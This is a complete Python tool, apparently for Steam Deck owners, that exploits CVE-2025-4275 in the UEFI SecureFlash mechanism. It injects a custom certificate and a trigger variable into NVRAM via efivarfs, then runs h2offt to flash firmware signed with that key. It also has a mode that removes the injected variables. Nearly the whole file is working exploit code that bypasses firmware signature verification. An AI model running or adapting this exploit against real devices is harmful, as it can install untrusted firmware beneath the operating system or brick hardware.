#!/usr/bin/env python3
"""
SecureFlash Guided Flash Utility
==================================
Guided firmware flashing utility for Steam Deck. Handles certificate
injection into NVRAM (CVE-2025-4275) and firmware flashing via h2offt.

Run on the Steam Deck (SteamOS Desktop Mode, Konsole) with root privileges.
Copy this script alongside your signed .fd and .esl files.

Modes:
  Flash:  sudo python3 secureflash_flash.py [firmware.fd] [cert.esl]
  Revert: sudo python3 secureflash_flash.py --revert

Reference:
  CVE-2025-4275 — https://www.kb.cert.org/vuls/id/211341
  SD-APCB-Tool  — https://github.com/djanice1980/SD-APCB-Tool

Usage:
  sudo python3 secureflash_flash.py                   # auto-detect files in CWD
  sudo python3 secureflash_flash.py firmware.fd cert.esl  # explicit paths
  sudo python3 secureflash_flash.py --revert           # remove cert from NVRAM
"""

import os
import sys
import struct
import glob
import subprocess
import argparse


# ============================================================================
# Constants
# ============================================================================

SCRIPT_VERSION = "1.0.0"

# SecureFlash NVRAM variable GUID (from Hydroph0bia PoC)
SECUREFLASH_GUID = "382af2bb-ffff-abcd-aaee-cce099338877"

# Variable names
CERT_VAR_NAME = "SecureFlashCertData"
MODE_VAR_NAME = "SecureFlashSetupMode"

# Full efivarfs paths
EFIVARFS_PATH = "/sys/firmware/efi/efivars"
CERT_VAR_PATH = f"{EFIVARFS_PATH}/{CERT_VAR_NAME}-{SECUREFLASH_GUID}"
MODE_VAR_PATH = f"{EFIVARFS_PATH}/{MODE_VAR_NAME}-{SECUREFLASH_GUID}"

# UEFI variable attributes: NV|BS|RT (non-volatile, boot service, runtime access)
NV_BS_RT_ATTRS = struct.pack('<I', 0x00000007)

# h2offt known locations
H2OFFT_PATHS = [
    "/usr/share/jupiter_bios_updater/h2offt",
    "/usr/local/bin/h2offt",
    "/usr/bin/h2offt",
]

# Directories to search for h2offt if not at known paths
H2OFFT_SEARCH_DIRS = ["/usr/share", "/usr/local", "/opt"]

# DMI/SMBIOS sysfs paths
DMI_BIOS_VENDOR = "/sys/class/dmi/id/bios_vendor"
DMI_BIOS_VERSION = "/sys/class/dmi/id/bios_version"
DMI_BIOS_DATE = "/sys/class/dmi/id/bios_date"
DMI_PRODUCT_NAME = "/sys/class/dmi/id/product_name"

# EFI_CERT_X509_GUID for EFI_SIGNATURE_LIST
EFI_CERT_X509_GUID = bytes([
    0xa1, 0x59, 0xc0, 0xa5,  # Data1 (LE)
    0xe4, 0x94,              # Data2 (LE)
    0xa7, 0x4a,              # Data3 (LE)
    0x87, 0xb5,              # Data4[0:2] (BE)
    0xab, 0x15, 0x5c, 0x2b, 0xf0, 0x72  # Data4[2:8] (BE)
])


# ============================================================================
# Helper Functions (duplicated from secureflash_check.py for standalone use)
# ============================================================================

def _read_dmi_field(path: str) -> str:
    """Read a DMI/SMBIOS field from sysfs."""
    try:
        with open(path, 'r') as f:
            return f.read().strip()
    except (FileNotFoundError, PermissionError):
        return "(unavailable)"


def _read_efivar(path: str) -> tuple:
    """Read a UEFI variable from efivarfs.

    Returns:
        (attributes: int, data: bytes) or (None, None) on failure.
    """
    try:
        with open(path, 'rb') as f:
            raw = f.read()
        if len(raw) < 4:
            return None, None
        attrs = struct.unpack_from('<I', raw, 0)[0]
        data = raw[4:]
        return attrs, data
    except (FileNotFoundError, PermissionError, OSError):
        return None, None


def _decode_esl(data: bytes) -> list:
    """Decode an EFI_SIGNATURE_LIST structure.

    Returns list of dicts with keys: type_guid, is_x509, owner_guid,
    cert_data, cert_size, and optionally 'cn' for X.509 certs.
    """
    entries = []
    offset = 0
    while offset + 28 <= len(data):
        sig_type = data[offset:offset + 16]
        list_size = struct.unpack_from('<I', data, offset + 16)[0]
        header_size = struct.unpack_from('<I', data, offset + 20)[0]
        sig_size = struct.unpack_from('<I', data, offset + 24)[0]

        if list_size == 0 or sig_size == 0:
            break

        entry_offset = offset + 28 + header_size
        while entry_offset + sig_size <= offset + list_size:
            owner_guid = data[entry_offset:entry_offset + 16]
            cert_data = data[entry_offset + 16:entry_offset + sig_size]

            entry = {
                'type_guid': sig_type,
                'is_x509': sig_type == EFI_CERT_X509_GUID,
                'owner_guid': owner_guid,
                'cert_data': cert_data,
                'cert_size': len(cert_data),
            }
            if entry['is_x509']:
                cn = _extract_cn_from_der(cert_data)
                if cn:
                    entry['cn'] = cn
            entries.append(entry)
            entry_offset += sig_size

        offset += list_size
    return entries


def _extract_cn_from_der(cert_der: bytes) -> str:
    """Extract Common Name from a DER-encoded X.509 certificate."""
    cn_oid = bytes([0x55, 0x04, 0x03])  # OID 2.5.4.3 (commonName)
    pos = 0
    while pos < len(cert_der) - 5:
        if (cert_der[pos] == 0x06 and
                cert_der[pos + 1] == 0x03 and
                cert_der[pos + 2:pos + 5] == cn_oid):
            val_pos = pos + 5
            if val_pos < len(cert_der):
                val_tag = cert_der[val_pos]
                if val_tag in (0x0C, 0x13, 0x16):  # UTF8, Printable, IA5
                    val_len = cert_der[val_pos + 1]
                    if val_len < 0x80:
                        val_start = val_pos + 2
                        try:
                            return cert_der[val_start:val_start + val_len].decode('utf-8')
                        except UnicodeDecodeError:
                            return cert_der[val_start:val_start + val_len].decode('latin-1')
        pos += 1
    return None


# ============================================================================
# Output Helpers
# ============================================================================

def _status(tag: str, msg: str):
    """Print a status line: [TAG] message"""
    print(f"  [{tag:>4s}] {msg}")


def _header(title: str):
    """Print a section header."""
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")


def _step(num: int, title: str):
    """Print a step header."""
    print(f"\n--- Step {num}: {title} ---")


def _confirm(prompt: str, default_no: bool = True) -> bool:
    """Ask user for confirmation. Returns True if confirmed."""
    suffix = " [y/N] " if default_no else " [Y/n] "
    try:
        answer = input(f"\n  {prompt}{suffix}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    if default_no:
        return answer in ('y', 'yes')
    else:
        return answer not in ('n', 'no')


def _abort(msg: str):
    """Print error and exit."""
    print(f"\n  [FAIL] {msg}")
    sys.exit(1)


# ============================================================================
# Pre-flight Checks
# ============================================================================

def check_platform():
    """Verify we're on Linux."""
    if sys.platform != 'linux':
        _abort("This utility runs on the Steam Deck (SteamOS/Linux).\n"
               "         Run it on the target device, not your PC.")


def check_root():
    """Verify we're running as root."""
    if os.geteuid() != 0:
        _abort("Root access required.\n"
               "         Run with: sudo python3 secureflash_flash.py")


def check_efivarfs():
    """Verify efivarfs is mounted."""
    if not os.path.isdir(EFIVARFS_PATH):
        _abort(f"efivarfs not mounted at {EFIVARFS_PATH}\n"
               f"         Try: mount -t efivarfs efivarfs {EFIVARFS_PATH}")


def find_h2offt(override_path: str = None) -> str:
    """Find the h2offt binary. Returns path or aborts."""
    if override_path:
        if os.path.isfile(override_path) and os.access(override_path, os.X_OK):
            return override_path
        _abort(f"h2offt not found at specified path: {override_path}")

    # Check known paths
    for path in H2OFFT_PATHS:
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return path

    # Search common directories
    for search_dir in H2OFFT_SEARCH_DIRS:
        if not os.path.isdir(search_dir):
            continue
        for root, dirs, files in os.walk(search_dir):
            if 'h2offt' in files:
                found = os.path.join(root, 'h2offt')
                if os.access(found, os.X_OK):
                    return found

    _abort("h2offt not found. Is this a Steam Deck with SteamOS?\n"
           "         Expected at: /usr/share/jupiter_bios_updater/h2offt")


def read_device_info() -> dict:
    """Read device info from DMI sysfs."""
    vendor = _read_dmi_field(DMI_BIOS_VENDOR)
    version = _read_dmi_field(DMI_BIOS_VERSION)
    date = _read_dmi_field(DMI_BIOS_DATE)
    product = _read_dmi_field(DMI_PRODUCT_NAME)

    # Detect Steam Deck variant
    product_lower = product.lower()
    variant = 'Unknown'
    if 'galileo' in product_lower:
        variant = 'Steam Deck OLED (Galileo)'
    elif 'jupiter' in product_lower:
        variant = 'Steam Deck LCD (Jupiter)'
    elif 'steam deck' in product_lower:
        variant = 'Steam Deck'

    return {
        'vendor': vendor,
        'version': version,
        'date': date,
        'product': product,
        'variant': variant,
    }


def find_files(args) -> tuple:
    """Find .fd and .esl files. Returns (fd_path, esl_path)."""
    fd_path = args.firmware
    esl_path = args.certificate

    # Auto-detect from CWD if not specified
    if fd_path is None:
        fd_files = sorted(glob.glob('*.fd'))
        if len(fd_files) == 1:
            fd_path = fd_files[0]
        elif len(fd_files) > 1:
            print("\n  Multiple .fd files found in current directory:")
            for f in fd_files:
                size = os.path.getsize(f)
                print(f"    {f} ({size:,} bytes)")
            _abort("Specify which .fd file to use:\n"
                   "         sudo python3 secureflash_flash.py <firmware.fd> [cert.esl]")
        else:
            _abort("No .fd firmware file found in current directory.\n"
                   "         Specify the path: sudo python3 secureflash_flash.py <firmware.fd>")

    if esl_path is None:
        esl_files = sorted(glob.glob('*.esl'))
        if len(esl_files) == 1:
            esl_path = esl_files[0]
        elif len(esl_files) > 1:
            print("\n  Multiple .esl files found in current directory:")
            for f in esl_files:
                size = os.path.getsize(f)
                print(f"    {f} ({size:,} bytes)")
            _abort("Specify which .esl file to use:\n"
                   "         sudo python3 secureflash_flash.py <firmware.fd> <cert.esl>")
        else:
            _abort("No .esl certificate file found in current directory.\n"
                   "         Specify the path: sudo python3 secureflash_flash.py <firmware.fd> <cert.esl>")

    # Validate files exist
    if not os.path.isfile(fd_path):
        _abort(f"Firmware file not found: {fd_path}")
    if not os.path.isfile(esl_path):
        _abort(f"Certificate file not found: {esl_path}")

    return fd_path, esl_path


# ============================================================================
# Certificate Operations
# ============================================================================

def read_esl_file(esl_path: str) -> tuple:
    """Read and parse an ESL file. Returns (raw_blob, cert_entries).

    The .esl file includes a 4-byte efivarfs attribute prefix.
    """
    with open(esl_path, 'rb') as f:
        blob = f.read()

    if len(blob) < 36:  # 4 attrs + 28 ESL header minimum
        _abort(f"ESL file too small ({len(blob)} bytes): {esl_path}")

    # Verify efivarfs attribute prefix
    attrs = struct.unpack_from('<I', blob, 0)[0]
    if attrs != 0x00000007:
        _abort(f"ESL file has unexpected attributes: 0x{attrs:08X} (expected 0x00000007)\n"
               f"         File may not be a valid efivarfs blob: {esl_path}")

    esl_data = blob[4:]  # Strip 4-byte attribute prefix for parsing
    entries = _decode_esl(esl_data)

    if not entries:
        _abort(f"No certificate entries found in ESL file: {esl_path}")

    return blob, entries


def check_existing_cert(esl_path: str) -> str:
    """Check if SecureFlashCertData exists in NVRAM and compare with ESL file.

    Returns:
        'none'      — no cert in NVRAM
        'same'      — cert in NVRAM matches the ESL file
        'different' — cert in NVRAM is different from ESL file
    """
    attrs, nvram_data = _read_efivar(CERT_VAR_PATH)

    if attrs is None or nvram_data is None:
        return 'none'

    # Parse NVRAM cert
    nvram_entries = _decode_esl(nvram_data)
    if not nvram_entries:
        return 'none'  # Variable exists but no valid ESL data

    # Parse ESL file (skip 4-byte attribute prefix)
    with open(esl_path, 'rb') as f:
        esl_blob = f.read()
    esl_entries = _decode_esl(esl_blob[4:])
    if not esl_entries:
        return 'none'

    # Compare first cert DER bytes (exact binary match)
    nvram_cert = nvram_entries[0].get('cert_data', b'')
    esl_cert = esl_entries[0].get('cert_data', b'')

    if nvram_cert == esl_cert:
        return 'same'
    else:
        return 'different'


def get_nvram_cert_cn() -> str:
    """Get the CN of the cert currently in NVRAM, or None."""
    attrs, data = _read_efivar(CERT_VAR_PATH)
    if attrs is None or data is None:
        return None
    entries = _decode_esl(data)
    if entries:
        return entries[0].get('cn', '(unknown CN)')
    return None


def inject_certificate(esl_path: str):
    """Write ESL file to SecureFlashCertData and set SecureFlashSetupMode trigger."""
    with open(esl_path, 'rb') as f:
        blob = f.read()

    # Write SecureFlashCertData
    try:
        with open(CERT_VAR_PATH, 'wb') as f:
            f.write(blob)
    except PermissionError:
        _abort("Permission denied writing to NVRAM.\n"
               "         Device may be patched against CVE-2025-4275.\n"
               "         Use the SPI programmer method instead.")
    except OSError as e:
        if e.errno == 1:  # EPERM — VariablePolicy locking
            _abort("NVRAM write blocked (EPERM). Device firmware has been patched.\n"
                   "         CVE-2025-4275 is no longer exploitable on this device.\n"
                   "         Use the SPI programmer method instead.")
        elif e.errno == 22:  # EINVAL
            _abort(f"NVRAM write rejected (EINVAL). Variable attributes may be wrong.\n"
                   f"         Error: {e}")
        else:
            _abort(f"NVRAM write failed: {e}")

    # Verify the write
    attrs, data = _read_efivar(CERT_VAR_PATH)
    if attrs is None:
        _abort("Certificate injection failed — could not read back variable.")
    _status("OK", "SecureFlashCertData injected into NVRAM.")

    # Set SecureFlashSetupMode trigger (required for SecurityStubDxe to use the cert)
    mode_blob = NV_BS_RT_ATTRS + b'\x01'  # 4 bytes attrs + 1 byte trigger value
    try:
        with open(MODE_VAR_PATH, 'wb') as f:
            f.write(mode_blob)
    except OSError as e:
        _status("WARN", f"Could not set SecureFlashSetupMode: {e}")
        _status("INFO", "Certificate was injected but the trigger may be missing.")
        return

    # Verify trigger
    attrs, data = _read_efivar(MODE_VAR_PATH)
    if attrs is not None and len(data) >= 1 and data[0] == 1:
        _status("OK", "SecureFlashSetupMode trigger set (value=1).")
    else:
        _status("WARN", "SecureFlashSetupMode write may not have persisted.")


def _remove_efivar(path: str, name: str) -> bool:
    """Remove a single efivar. Returns True on success."""
    if not os.path.exists(path):
        return True  # Already gone

    # Remove immutable flag (efivarfs sets this automatically)
    try:
        subprocess.run(['chattr', '-i', path],
                       capture_output=True, timeout=10)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass  # chattr may not be available, try rm anyway

    try:
        os.unlink(path)
        return True
    except OSError as e:
        _status("FAIL", f"Could not remove {name}: {e}")
        _status("INFO", f"Try manually: sudo chattr -i {path} && sudo rm {path}")
        return False


def remove_certificate() -> bool:
    """Remove SecureFlashCertData and SecureFlashSetupMode from NVRAM."""
    has_cert = os.path.exists(CERT_VAR_PATH)
    has_mode = os.path.exists(MODE_VAR_PATH)

    if not has_cert and not has_mode:
        _status("SKIP", "No SecureFlash variables found in NVRAM.")
        return True

    success = True

    if has_cert:
        if _remove_efivar(CERT_VAR_PATH, "SecureFlashCertData"):
            _status("OK", "SecureFlashCertData removed.")
        else:
            success = False

    if has_mode:
        if _remove_efivar(MODE_VAR_PATH, "SecureFlashSetupMode"):
            _status("OK", "SecureFlashSetupMode removed.")
        else:
            success = False

    return success


def replace_certificate(esl_path: str):
    """Remove existing cert from NVRAM and inject new one."""
    _status("INFO", "Removing existing certificate from NVRAM...")
    if not remove_certificate():
        _abort("Could not remove existing certificate. Cannot proceed.")
    _status("INFO", "Injecting new certificate...")
    inject_certificate(esl_path)


# ============================================================================
# Flash Operations
# ============================================================================

def validate_firmware(fd_path: str) -> dict:
    """Basic validation of firmware file."""
    size = os.path.getsize(fd_path)
    with open(fd_path, 'rb') as f:
        magic = f.read(2)

    if magic != b'MZ':
        _abort(f"Not a valid PE firmware file (no MZ header): {fd_path}")

    return {
        'path': fd_path,
        'filename': os.path.basename(fd_path),
        'size': size,
    }


def run_h2offt(h2offt_path: str, fd_path: str) -> int:
    """Execute h2offt to flash firmware. Returns exit code.

    h2offt output flows directly to the terminal. On success, h2offt
    automatically reboots the system — the script will not return.
    """
    print()  # Blank line before h2offt output
    try:
        result = subprocess.run(
            [h2offt_path, fd_path, '-all'],
            timeout=300,  # 5-minute timeout
        )
        return result.returncode
    except subprocess.TimeoutExpired:
        _status("FAIL", "h2offt timed out after 5 minutes.")
        return -1
    except OSError as e:
        _status("FAIL", f"Failed to execute h2offt: {e}")
        return -1


# ============================================================================
# Main Flow
# ============================================================================

def main_flash(args):
    """Main flash flow: pre-flight → cert inject → flash."""

    _header(f"SecureFlash Guided Flash Utility v{SCRIPT_VERSION}")

    # ── Step 1: Pre-flight ──
    _step(1, "Pre-flight Checks")

    check_platform()
    _status("OK", "Running on Linux")

    check_root()
    _status("OK", "Running as root")

    check_efivarfs()
    _status("OK", f"efivarfs mounted at {EFIVARFS_PATH}")

    h2offt_path = find_h2offt(args.h2offt)
    _status("OK", f"h2offt found: {h2offt_path}")

    device = read_device_info()
    _status("INFO", f"Device: {device['variant']}")
    _status("INFO", f"BIOS:   {device['version']} ({device['vendor']}, {device['date']})")

    fd_path, esl_path = find_files(args)
    fd_info = validate_firmware(fd_path)
    _status("OK", f"Firmware: {fd_info['filename']} ({fd_info['size']:,} bytes)")

    esl_blob, esl_entries = read_esl_file(esl_path)
    cert_cn = esl_entries[0].get('cn', '(unknown)')
    _status("OK", f"Certificate: {os.path.basename(esl_path)} "
            f"({len(esl_blob):,} bytes, CN={cert_cn})")

    # ── Step 2: Certificate Check ──
    _step(2, "Certificate Check")

    if args.skip_cert:
        _status("SKIP", "Certificate check skipped (--skip-cert)")
    else:
        cert_status = check_existing_cert(esl_path)

        if cert_status == 'same':
            _status("OK", "Certificate already in NVRAM and matches.")
            # Ensure SecureFlashSetupMode trigger is also set
            mode_attrs, mode_data = _read_efivar(MODE_VAR_PATH)
            if mode_attrs is None or len(mode_data) < 1 or mode_data[0] != 1:
                _status("INFO", "SecureFlashSetupMode trigger not set — setting now.")
                mode_blob = NV_BS_RT_ATTRS + b'\x01'
                try:
                    with open(MODE_VAR_PATH, 'wb') as f:
                        f.write(mode_blob)
                    _status("OK", "SecureFlashSetupMode trigger set (value=1).")
                except OSError as e:
                    _status("WARN", f"Could not set SecureFlashSetupMode: {e}")
            else:
                _status("OK", "SecureFlashSetupMode trigger is set. Ready to flash.")
        elif cert_status == 'different':
            nvram_cn = get_nvram_cert_cn() or '(unknown)'
            _status("!", f"A DIFFERENT certificate is in NVRAM (CN={nvram_cn})")
            _status("INFO", f"Your certificate: CN={cert_cn}")
            if not _confirm("Replace the existing certificate with yours?"):
                _abort("Cannot flash — certificate mismatch. Aborting.")
            replace_certificate(esl_path)
        else:  # 'none'
            _status("INFO", "No SecureFlashCertData found in NVRAM.")
            _status("INFO", f"Will inject certificate: CN={cert_cn}")
            if not _confirm("Inject certificate into NVRAM?"):
                _abort("Certificate injection cancelled.")
            inject_certificate(esl_path)

    # ── Step 3: Flash ──
    _step(3, "Flash Firmware")

    _status("INFO", f"Firmware: {fd_info['filename']} ({fd_info['size']:,} bytes)")
    _status("!", "WARNING: This will update your BIOS firmware.")
    _status("!", "Make sure you are on AC power or have sufficient battery.")
    _status("!", "h2offt will reboot the system automatically on success.")

    if not _confirm("Flash firmware now?"):
        _abort("Flash cancelled by user.")

    _status("WAIT", "Running h2offt...")

    exit_code = run_h2offt(h2offt_path, fd_path)

    # If we get here, h2offt did NOT reboot (likely an error)
    if exit_code == 0:
        # h2offt succeeded but didn't reboot — unusual
        _status("OK", "h2offt completed successfully (exit code 0).")
        _status("INFO", "System did not auto-reboot. You may need to reboot manually.")
    else:
        _status("FAIL", f"h2offt failed with exit code {exit_code}.")
        _status("INFO", "The firmware was NOT flashed successfully.")
        _status("INFO", "If this persists, use the SPI programmer method instead.")
        sys.exit(1)


def main_revert(args):
    """Revert flow: remove injected certificate from NVRAM."""

    _header(f"SecureFlash Certificate Removal v{SCRIPT_VERSION}")

    check_platform()
    check_root()
    check_efivarfs()

    _step(1, "Check NVRAM Certificate")

    has_cert = os.path.exists(CERT_VAR_PATH)
    has_mode = os.path.exists(MODE_VAR_PATH)

    if not has_cert and not has_mode:
        _status("INFO", "No SecureFlash variables found in NVRAM.")
        _status("OK", "Nothing to remove — NVRAM is clean.")
        return

    if has_cert:
        attrs, data = _read_efivar(CERT_VAR_PATH)
        entries = _decode_esl(data) if data else []
        if entries:
            cn = entries[0].get('cn', '(unknown)')
            _status("INFO", f"Found SecureFlashCertData: CN={cn}")
            _status("INFO", f"Certificate size: {entries[0]['cert_size']:,} bytes")
        else:
            _status("INFO", "Found SecureFlashCertData but could not parse certificate.")

    if has_mode:
        mode_attrs, mode_data = _read_efivar(MODE_VAR_PATH)
        if mode_data and len(mode_data) >= 1:
            _status("INFO", f"Found SecureFlashSetupMode: value={mode_data[0]}")
        else:
            _status("INFO", "Found SecureFlashSetupMode variable.")

    _step(2, "Remove Certificate")

    _status("INFO", "Removing the injected certificate restores the default SecureFlash")
    _status("INFO", "trust store. h2offt will no longer accept firmware signed with")
    _status("INFO", "your custom key after removal.")

    if not _confirm("Remove the injected certificate from NVRAM?"):
        _status("SKIP", "Certificate removal cancelled.")
        return

    if remove_certificate():
        # Verify removal
        cert_gone = not os.path.exists(CERT_VAR_PATH)
        mode_gone = not os.path.exists(MODE_VAR_PATH)
        if cert_gone and mode_gone:
            _status("OK", "All SecureFlash variables removed from NVRAM.")
        else:
            if not cert_gone:
                _status("!", "SecureFlashCertData still exists after removal attempt.")
            if not mode_gone:
                _status("!", "SecureFlashSetupMode still exists after removal attempt.")
    else:
        _status("FAIL", "Could not remove SecureFlash variables.")
        sys.exit(1)


def main():
    """Entry point with argument parsing."""
    parser = argparse.ArgumentParser(
        description=f'SecureFlash Guided Flash Utility v{SCRIPT_VERSION} — '
                    f'Flash signed firmware on Steam Deck via h2offt',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 secureflash_flash.py                        "
            "# auto-detect .fd and .esl in CWD\n"
            "  sudo python3 secureflash_flash.py firmware.fd cert.esl   "
            "# specify files explicitly\n"
            "  sudo python3 secureflash_flash.py --revert               "
            "# remove injected cert from NVRAM\n"
        ))

    parser.add_argument('firmware', nargs='?', default=None,
                        help='Signed firmware .fd file (auto-detect in CWD if omitted)')
    parser.add_argument('certificate', nargs='?', default=None,
                        help='Certificate .esl file (auto-detect in CWD if omitted)')
    parser.add_argument('--revert', action='store_true',
                        help='Remove injected certificate from NVRAM (no flash)')
    parser.add_argument('--h2offt', default=None,
                        help='Path to h2offt binary (auto-detect if omitted)')
    parser.add_argument('--skip-cert', action='store_true',
                        help='Skip certificate injection (assume already done)')

    args = parser.parse_args()

    try:
        if args.revert:
            main_revert(args)
        else:
            main_flash(args)
    except KeyboardInterrupt:
        print(f"\n\n  [{'FAIL':>4s}] Aborted by user.")
        sys.exit(130)


if __name__ == '__main__':
    main()
